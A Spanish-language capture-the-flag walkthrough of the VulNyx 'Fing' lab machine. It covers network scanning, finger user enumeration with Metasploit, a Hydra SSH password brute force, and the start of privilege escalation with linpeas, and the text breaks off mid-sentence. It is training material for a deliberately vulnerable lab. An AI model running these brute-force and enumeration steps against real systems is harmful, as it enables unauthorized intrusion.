---
Nombre de la máquina: Fing
Sistema Operativo: Linux
Enlace de descarga: https://vulnyx.com/
---

## Escaneo de equipos de la red.

Una vez descargada la maquina y levantada en nuestro virtualizador, la buscamos con la herramienta ARP-SCAN.
```
sudo arp-scan -I (NUESTRA INTERFAZ) --localnet
```

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/cc792507-e35e-4d23-a315-86612237ff7e)

Nos damos cuenta ya que luego de la MAC el escaneo con arp-scan nos dice "VMware", si aun no estamos seguros podemos tirarle un ping para verificar la conexion y su ttl.

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/eb6f7ab9-0473-4fb1-9018-bec0e316b4b3)


## Nmap.

Una vez tenemos claro la IP objetivo, es momento de el escaneo con nmap.
```
sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 192.168.1.105
```

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/01ebda0f-42f4-4834-b556-48c121ee84bf)

Como vemos, el escaneo de puertos nos dice que hay 3 puertos abiertos, 22/ssh, 79/finger y 80/http. Como se constumbre, lo primero es revisar la aplicacion web que esta corriendo en el puerto  80.

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/821b6b76-6410-484a-8bf4-d7f39b1440db)

Se trata de un Apache por defecto, por lo que vamos a buscar directios en caso de haber.

## Fuzzing.

```
gobuster dir -u http://192.168.1.105 -w (DICCIONARIO)
```

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/790ff582-ba3a-441d-aec7-5b2f88f3c782)

Como vemos la herramienta Gobuster no nos encuentra nada interesante, por lo que podriamos ponernos en la busqueda de subdirectorios, aunque primero vamos a revisar el servicio del puerto 79 que nos encontro el escaneo con nmap, finger.

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/fccd9f50-b88e-4b60-a05f-2258fad848ce)
![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/0fd5efe5-b008-4e25-92f8-e0793d775a87)

Como vemos nos dice que tenemos modulos en Metasploit para dicho servicio.

## Metasploit.

Ejectuamos metasploit y buscamos un modulo por la palabra "finger".

```
msfconsole
```
```
search finger
```

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/9e9f5a1f-fb23-4c1d-9343-f23d5f2c4ccd)

Como vemos con el modulo numero 1 podemos listar usuario, por lo que procedemos a configurarlo y ejecutarlo.

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/f5cc909a-89c7-4939-8899-debd586ac97f)

Luego de configurado el exploit seteando la ip objetivo y el diccionario que utilizamos para el ataque con nombres de usuarios, nos dice que hay un usuario de nombre "adam"
Rapidamente probamos sin exito con el modulo de ataques de fuerza bruta al protocolo ssh, por lo que seguimos con la herramienta Hydra.

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/60bebce6-9903-4aaa-b9e2-0f8c40f9f670)

## Hydra.

Atacamos con hydra indicando el usurio, el diccionario que vamos a utilizar y el protocolo que vamos a atacar.

```
sudo hydra -l adam -P DICCIONARIO ssh://192.168.1.105
```

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/f26d8fd3-dd24-4a9a-89d0-1f6884443d26)

Hydra nos encuentra la contraseña "passion", por lo que nos conectamos por ssh.

## Escalada de privilegios.

Lo primero que probamos son los comandos:

```
sudo -l
```
```
find / -perm -4000 2</dev/null
```

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/7c596878-a73b-4511-af43-0c1473cb4b64)

Dentro de los binarios no vemos nada llamativo, mas que el binario DOAS, por lo que procedemos a descargar y usar la herramienta "linpeas.sh" para estar mas seguros.

```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
```

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/0e16e493-2b1c-4da1-afdc-f02e4f300f31)

Como vemos el resultado del escaneo con linpeas nos 
